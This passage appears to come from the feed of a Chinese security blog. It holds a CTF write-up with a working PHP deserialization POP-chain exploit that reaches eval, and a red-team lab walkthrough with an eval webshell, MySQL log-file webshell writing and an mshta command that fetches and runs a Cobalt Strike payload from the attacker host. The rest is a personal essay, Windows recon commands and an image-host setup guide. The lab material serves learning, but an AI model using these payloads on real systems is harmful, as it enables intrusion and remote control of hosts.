title="具体开干"></a>具体开干</h2><p>其实到这里我们基本上稀里糊涂的或许大概明白了什么意思。。。那就开搞呗。有源码，一点点分析好了</p><p>我的思路这种简短的源码，我喜欢先定位危险函数再去反推<code>POP</code>链</p><p>代码中我们发现危险函数<code>eval</code>藏在类<code>h</code>的<code>__call</code>中，且要保证条件<code>in_array($method, $this-&gt;method)</code>成立,这里可以直接控制<code>$method = arry(&#39;haha&#39;,&#39;hehe&#39;,&#39;dada&#39;);</code></p><p>调用<code>__call</code>魔法函数只需调用其实例化类本身不存在的方法即可，刚好在类<code>e</code>中存在成员变量<code>h</code>调用了一个<code>haha</code>方法，该方法刚好是类<code>h</code>不存在的,即<code>$obj = new e;$obj-&gt;f=new h;</code></p><p>要想触发以上条件就需要触发<code>__clone</code>魔法函数，根据前序只是我们知道，<code>clone</code>即可触发,且<code>clone</code>是在<code>__get</code>魔法函数中,即<code>$obj = new z;$obj-&gt;a = new e;</code></p><p>触发<code>__get</code>魔法函数，只需调用其实例化类对象中不存在或者无权限调用的成员属性即可</p><p>刚好在类<code>z</code>中存在<code>__toString</code>魔法函数，里面执行了成员变量引用，那么<code>$a = new e</code>即可</p><p>传参接口<code>poc</code>刚好在反序列化的时候被<code>echo</code>了，那么刚好可以直接触发<code>__toString</code></p><h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><p>根据分析具体思路构造一个完美的exp即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;b[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">h</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&quot;haha&quot;</span>,<span class="string">&quot;hehe&quot;</span>,<span class="string">&quot;dada&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;method))&#123;</span><br><span class="line"><span class="keyword">eval</span>(array_shift(<span class="variable">$arg</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;xixi=<span class="keyword">clone</span> <span class="keyword">$this</span>-&gt;z;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;f-&gt;haha(<span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> z;</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="keyword">new</span> e; <span class="comment">//触发__get</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;a-&gt;z = <span class="variable">$obj</span>-&gt;a; <span class="comment">//__clone 的深拷贝用法</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;a-&gt;z-&gt;f = <span class="keyword">new</span> h;  <span class="comment">//赋值实例化h类， 触发__call</span></span><br><span class="line"><span class="variable">$poc</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">//echo $poc;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure><p><strong>output：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;z&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;e&quot;:3:&#123;s:1:&quot;z&quot;;r:2;s:1:&quot;f&quot;;O:1:&quot;h&quot;:1:&#123;s:6:&quot;method&quot;;a:3:&#123;i:0;s:4:&quot;haha&quot;;i:1;s:4:&quot;hehe&quot;;i:2;s:4:&quot;dada&quot;;&#125;&#125;s:3:&quot;arg&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="line">O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/timu2.php?poc=O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164159329.png" alt="image-20211201164159329"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png&quot; alt=&quot;image-20211201164317651&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://www.greetdawn.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="PHP反序列化" scheme="http://www.greetdawn.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>重新开始</title>
    <link href="http://www.greetdawn.top/2021/11/24/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/newstart/"/>
    <id>http://www.greetdawn.top/2021/11/24/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/newstart/</id>
    <published>2021-11-24T03:04:40.000Z</published>
    <updated>2022-02-25T16:18:00.854Z</updated>
    
    <content type="html"><![CDATA[<p>​        时过境迁，微信公众号开通到零零散散的发了几篇文章已经是2019年的事情了。那个时候还是个意气风发、朝气蓬勃的精神小伙。只身一人就毅然决然的跑到了北京，想开拓了一片属于自己的天地，可能这就是那个时候年轻人所谓的“梦想“吧。</p><span id="more"></span><p>​        一转眼再回想时，已经快过了有四年的时间了。那个时候还没有疫情，目前生活方式和特点和当初来说已经发生了较大的变化了。真的不仅是生活方式和大环境发生了变化，人的心态更是发生了更大的变化。</p><p>​        今天刚好和前同事商量恢复公众号的运营，前同事也是欣然的答应接受了。挺好的，虽然最近两年一直在尝试着写博客，但是总觉得缺点什么东西。总感觉自己处于一个不伦不类的生活和工作状态中。自己总想着改变自己的生活方式和节奏状态，但总感觉心有余而力不足。其实这里的力不足并不是说自己能力不够，而是自己<strong>没有一个持之以恒的态度，去长期坚持做好一件事情</strong>。比如写公众号、看书、学英语、早起这些之前给自己定的计划和安排，总没有一个成功落地实施的。自己总是处于一种心浮气躁的状态，囫囵吞枣，啥都做一做，啥都弄一弄，但是啥都不专精。其实说白了，这就是一种无能的表现。一个人连控制自己做什么都做不到，那就是处于被某种东西支配的现状下获取短暂的及时行乐，到头来却一无是处。其实真的开心么，或许是短暂的开心，冲内心里来说，自己不愿意处于这种现状中，但是自己却又无力走出来。</p><p>​        借着这个机会刚好总结一下这段时间的现状。最近一直围绕着工作不停的瞎折腾，最近下半年前前后后两个月时间里换了三份工作。其实自己在想到底是工作环境不对，还是我这个人不对。大概是我这个人出了问题，我的心思变得异常浮躁，对于身边的一切都开始变得惶恐、焦躁不安。觉得工作环境不合适，不利于我的个人发展，在诸多方面受到了压制，总是看到这些不好的层面。回想一下当初的工作心态就是单纯的，进入安全行业，努力学习安全技术就好。但是现在不一样了，随着工作经验的增加，技术的所谓提升，能力的所谓增加，一个人的心态发生了完全的变化。人的欲望开始增加，不单纯于技术的提升，人变得不纯粹了，更多的想着钱怎么挣多了，地位提升了，是不是可以做领导了。再这样的情况下，所有的环境都不满足自己了。</p><p>​        改变吧，从心态上开始。慢慢适应，慢慢提升。希望公众号的运营能够再次启程，和朋友共同经营下能够越来越好吧！胡扯了这么多有的没的，就这样吧，结束。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;​        时过境迁，微信公众号开通到零零散散的发了几篇文章已经是2019年的事情了。那个时候还是个意气风发、朝气蓬勃的精神小伙。只身一人就毅然决然的跑到了北京，想开拓了一片属于自己的天地，可能这就是那个时候年轻人所谓的“梦想“吧。&lt;/p&gt;</summary>
    
    
    
    <category term="个人随笔" scheme="http://www.greetdawn.top/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK_01靶场复现</title>
    <link href="http://www.greetdawn.top/2021/10/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT-CK-01/"/>
    <id>http://www.greetdawn.top/2021/10/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT-CK-01/</id>
    <published>2021-10-27T05:56:27.000Z</published>
    <updated>2022-02-25T16:19:23.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>靶场环境部署时，<code>win7</code>虚机需要进入系统手动开启一下<code>phpstudy</code>，且关闭防火墙。</p><span id="more"></span><h1 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看本机地址段，使用<code>netdiscover</code>发现同段存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.49.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165007738.png" alt="image-20211027165007738"></p><p>使用<code>nmap</code>扫描目前主机端口开放情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -sS 192.168.49.129</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165746145.png" alt="image-20211027165746145"></p><p>站点目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://192.168.49.129/&quot; -e php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028110507409.png" alt="image-20211028110507409"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028134039225.png" alt="image-20211028134039225"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="phpmyadmin写日志getshell"><a href="#phpmyadmin写日志getshell" class="headerlink" title="phpmyadmin写日志getshell"></a>phpmyadmin写日志getshell</h3><p>web访问发现直接是<code>phpstudy</code>探针,通过探针测试出<code>mysql</code>存在弱口令<code>root/root</code></p><p>因为<code>phpstudy</code>存在<code>phpmyadmin</code>组件，直接利用<code>phpmyadmin</code>实现写<code>webshell</code>操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p>但是开启了写文件限制</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172141356.png" alt="image-20211027172141356"></p><p>但是这里可以尝试使用日志文件<code>getshell</code></p><p>首先查看日志状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;%general%&#x27;; </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172342830.png" alt="image-20211027172342830"></p><p>当开启<code>general</code>时，所执行的<code>sql</code>语句都会出现在<code>stu1.log</code>文件中。那么，如果修改<code>generallogfile</code>的值，那么所执行的<code>sql</code>语句就会对应生成对应的文件中，进而<code>getshell</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br><span class="line">set GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p>再次执行含有<code>shell</code>的语句，请求发现写入成功</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172655912.png" alt="image-20211027172655912"></p><h3 id="后台弱口令getshell"><a href="#后台弱口令getshell" class="headerlink" title="后台弱口令getshell"></a>后台弱口令getshell</h3><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028140613746.png" alt="image-20211028140613746"></p><p>根据备份站点文件获取完整路径信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.49.129/yxcms/protected/apps/default/view/default/hack.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028141427018.png" alt="image-20211028141427018"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>前台注册用户留言板插入,后台审核通过即可触发。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028141605979.png" alt="image-20211028141605979"></p><p>在实际业务场景下，可以以次获取管理用户cookie，伪造登录</p><h2 id="主机上线"><a href="#主机上线" class="headerlink" title="主机上线"></a>主机上线</h2><h3 id="cs主机上线提权"><a href="#cs主机上线提权" class="headerlink" title="cs主机上线提权"></a>cs主机上线提权</h3><p>使用蚁剑成功连接<code>shell</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028103301810.png" alt="image-20211028103301810"></p><p>使用<code>cs html</code>上线主机，且是<code>administrator</code>权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.49.130:80/download/file.ext</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028104449312.png" alt="image-20211028104449312"></p><p>使用<code>cs</code>内建提权码，成功提至管理员权限</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028110034370.png" alt="image-20211028110034370"></p><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><code>shell ipconfig /all</code>获取内网主机网段为192.168.29.0/24 域为 <code>god.org</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028144122563.png" alt="image-20211028144122563"></p><p>查看域信息</p><p><code>shell net group /domain</code> </p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211122153614191.png" alt="image-20211122153614191"></p><p>上传<code>3389.bat</code>脚本开启3389端口 使用远程桌面进行连接</p><p>上传frp代理实现socks5内网穿透</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;靶场环境部署时，&lt;code&gt;win7&lt;/code&gt;虚机需要进入系统手动开启一下&lt;code&gt;phpstudy&lt;/code&gt;，且关闭防火墙。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="红日靶场" scheme="http://www.greetdawn.top/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>shiro权限绕过（CVE-2020-1957）</title>
    <link href="http://www.greetdawn.top/2021/10/26/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/"/>
    <id>http://www.greetdawn.top/2021/10/26/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/</id>
    <published>2021-10-26T02:50:30.000Z</published>
    <updated>2022-02-25T16:27:02.651Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><code>Apache Shiro</code>是一个强大且易用的<code>Java</code>安全框架,执行身份验证、授权、密码和会话管理。2020年8月18日，<code>Apache Shiro</code>官方发布安全通告<code> Apache Shiro</code>身份验证绕过漏洞（<code>CVE-2020-13933</code>），经过分析，攻击者可以通过构造特殊的<code>HTTP</code>请求实现身份验证绕过。<code>Shiro</code>框架通过拦截器功能来对用户访问权限进行控制，如<code>anon, authc</code>等拦截器。<code>anon</code>为匿名拦截器，不需要登录即可访问；<code>authc</code>为登录拦截器，需要登录才可以访问。主要是<code>Spring web</code>在匹配<code>url</code>的时候没有匹配上/导致绕过。</p><span id="more"></span><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>Apache Shiro &lt; 1.6.0</code> </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apache Shiro&lt;/code&gt;是一个强大且易用的&lt;code&gt;Java&lt;/code&gt;安全框架,执行身份验证、授权、密码和会话管理。2020年8月18日，&lt;code&gt;Apache Shiro&lt;/code&gt;官方发布安全通告&lt;code&gt; Apache Shiro&lt;/code&gt;身份验证绕过漏洞（&lt;code&gt;CVE-2020-13933&lt;/code&gt;），经过分析，攻击者可以通过构造特殊的&lt;code&gt;HTTP&lt;/code&gt;请求实现身份验证绕过。&lt;code&gt;Shiro&lt;/code&gt;框架通过拦截器功能来对用户访问权限进行控制，如&lt;code&gt;anon, authc&lt;/code&gt;等拦截器。&lt;code&gt;anon&lt;/code&gt;为匿名拦截器，不需要登录即可访问；&lt;code&gt;authc&lt;/code&gt;为登录拦截器，需要登录才可以访问。主要是&lt;code&gt;Spring web&lt;/code&gt;在匹配&lt;code&gt;url&lt;/code&gt;的时候没有匹配上/导致绕过。&lt;/p&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="shiro" scheme="http://www.greetdawn.top/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透信息收集</title>
    <link href="http://www.greetdawn.top/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Network-infiltration-base/"/>
    <id>http://www.greetdawn.top/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Network-infiltration-base/</id>
    <published>2021-08-14T05:46:21.000Z</published>
    <updated>2022-02-25T16:28:35.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透信息收集"><a href="#内网渗透信息收集" class="headerlink" title="内网渗透信息收集"></a>内网渗透信息收集</h1><span id="more"></span><h2 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h2><ul><li>获取主机名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><ul><li>查询所有计算名称</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer</span><br></pre></td></tr></table></figure><ul><li>查看配置及补丁信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get description,installedOn /format:csv</span><br></pre></td></tr></table></figure><ul><li>系统版本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure><ul><li>进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">wmic process get caption,executablepath,commandline /format:csv</span><br><span class="line">get-process</span><br></pre></td></tr></table></figure><ul><li>查看所有环境变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><ul><li>查看计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /QUERY /fo LIST /v</span><br></pre></td></tr></table></figure><ul><li>查看安装驱动</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRIVERQUERY</span><br></pre></td></tr></table></figure><ul><li>操作系统信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">架构 wmic os get osarchitecture</span><br><span class="line">系统名 wmic os get caption</span><br></pre></td></tr></table></figure><ul><li><p>查看逻辑盘 <code>wmic logicaldisk get caption</code></p></li><li><p>查看安装的软件信息 <code>wmic product get name,version</code></p></li><li><p>查看服务信息</p><p><code>wmic service list brief</code></p><p><code>sc query</code></p></li></ul><h2 id="0x02-域信息"><a href="#0x02-域信息" class="headerlink" title="0x02 域信息"></a>0x02 域信息</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;内网渗透信息收集&quot;&gt;&lt;a href=&quot;#内网渗透信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网渗透信息收集&quot;&gt;&lt;/a&gt;内网渗透信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="知识点总结" scheme="http://www.greetdawn.top/tags/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    
    <category term="信息收集" scheme="http://www.greetdawn.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>picgo+gitee图床配置</title>
    <link href="http://www.greetdawn.top/2021/08/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/picgo-gitee-config/"/>
    <id>http://www.greetdawn.top/2021/08/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/picgo-gitee-config/</id>
    <published>2021-08-10T05:43:31.000Z</published>
    <updated>2022-02-25T16:38:56.612Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/code-820275_1920.jpg" alt="code-820275_1920"></p><span id="more"></span><h2 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h2><p><a href="https://github.com/Molunerfinn/PicGo/releases">picgo下载链接</a></p><p><a href="https://nodejs.org/en/">nodejs下载地址</a></p><p>提示:必须要配置安装完成<code>nodejs</code>后才可下载后续的插件</p><h2 id="picgo插件安装"><a href="#picgo插件安装" class="headerlink" title="picgo插件安装"></a>picgo插件安装</h2><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210810135143608.png" alt="image-20210810135143608"></p><h2 id="gitee仓库配置"><a href="#gitee仓库配置" class="headerlink" title="gitee仓库配置"></a>gitee仓库配置</h2><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724140756.png" alt="img"></p><p>在仓库中新建一个文件<code>img</code>用于存放上传的图片。</p><h3 id="获取码云的token"><a href="#获取码云的token" class="headerlink" title="获取码云的token"></a>获取码云的token</h3><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143356.png" alt="img"></p><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143451.png" alt="img"></p><p>验证完码云的密码后，会显示出token。注意，这个token只会在这里显示一次。</p><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143552.png" alt="img"></p><p>保存好token，将在配置PicGo插件时使用。</p><h2 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h2><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210810135527262.png" alt="image-20210810135527262"></p><p><strong>repo</strong>: gitee用户名/仓库名</p><p><strong>branch</strong>: 分支。指定为主分支</p><p><strong>token</strong>: 私人令牌。之前在码云上创建的令牌</p><p><strong>path</strong>: 图片存放路径。创建仓库时，新建的文件夹名。</p><p><strong>customPath</strong>：提交消息，这一项和下一项<strong>customURL</strong>都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 <code>Upload 图片名 by picGo - 时间</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/code-820275_1920.jpg&quot; alt=&quot;code-820275_1920&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="环境配置" scheme="http://www.greetdawn.top/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="图床配置" scheme="http://www.greetdawn.top/tags/%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>2021年红帽杯初赛ctf部分试题wp</title>
    <link href="http://www.greetdawn.top/2021/05/10/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-redhat2021/"/>
    <id>http://www.greetdawn.top/2021/05/10/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-redhat2021/</id>
    <published>2021-05-10T10:16:53.000Z</published>
    <updated>2022-02-25T16:28:47.191Z</updated>
    
